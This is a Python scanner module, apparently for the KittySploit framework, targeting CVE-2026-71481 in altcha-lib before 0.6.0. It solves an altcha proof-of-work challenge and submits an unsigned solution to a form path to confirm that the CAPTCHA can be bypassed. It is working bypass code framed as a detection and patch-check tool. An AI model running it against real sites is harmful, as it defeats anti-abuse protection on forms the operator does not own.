#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CVE-2026-71481 — altcha challenge endpoint / signature bypass surface."""

from __future__ import annotations

from kittysploit import *
from lib.protocols.http.altcha import Altcha
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client, Altcha):
    __info__ = {
        "name": "altcha CVE-2026-71481 CAPTCHA bypass detect",
        "description": (
            "Detects altcha-style PoW challenges from a challenge URL path and "
            "optionally validates HMAC signature omission (altcha-lib < 0.6.0)."
        ),
        "author": ["KittySploit Team", "LLCForge"],
        "severity": "high",
        "cve": ["CVE-2026-71481"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-71481",
        ],
        "tags": ["altcha", "captcha", "auth-bypass", "scanner", "cve-2026-71481"],
        "agent": {
            "chain": {
                "suggested_followups": [
                    "auxiliary/admin/http/altcha_cve_2026_71481_captcha_bypass",
                ],
            },
        },
    }

    challenge_path = OptString(
        "/altcha",
        "Path that issues altcha challenges",
        required=False,
    )
    form_path = OptString(
        "",
        "Optional form path to probe bypass (POST)",
        required=False,
        advanced=True,
    )
    form_field = OptString("altcha", "POST field name for altcha payload", required=False)
    max_iter = OptInteger(1_000_000, "Max PoW iterations", required=False, advanced=True)

    _PATCHED_LIB = "0.6.0"

    def run(self):
        challenge_path = str(self.challenge_path or "/altcha").strip()
        b64, data = self.altcha_fetch_challenge(challenge_path)
        if not data:
            return False

        algo = str(data.get("algorithm", ""))
        reason = f"altcha PoW challenge ({algo}) at {challenge_path}"
        bypassed = False

        number = self.solve_pow(data, int(self.max_iter or 1_000_000))
        if number is not None:
            payload = self.encode_solution(data, number, include_signature=False)
            form_path = str(self.form_path or "").strip()
            if form_path:
                ok, code, _ = self.altcha_submit(
                    form_path,
                    str(self.form_field or "altcha"),
                    payload,
                )
                bypassed = ok
                if ok:
                    reason += f"; unsigned payload accepted (HTTP {code})"
            else:
                reason += "; PoW solved (set form_path to confirm bypass)"

        self.set_info(
            severity="high" if bypassed else "medium",
            cve="CVE-2026-71481",
            reason=reason,
            algorithm=algo,
            bypass_confirmed=bypassed,
            patched_version=self._PATCHED_LIB,
        )
        return True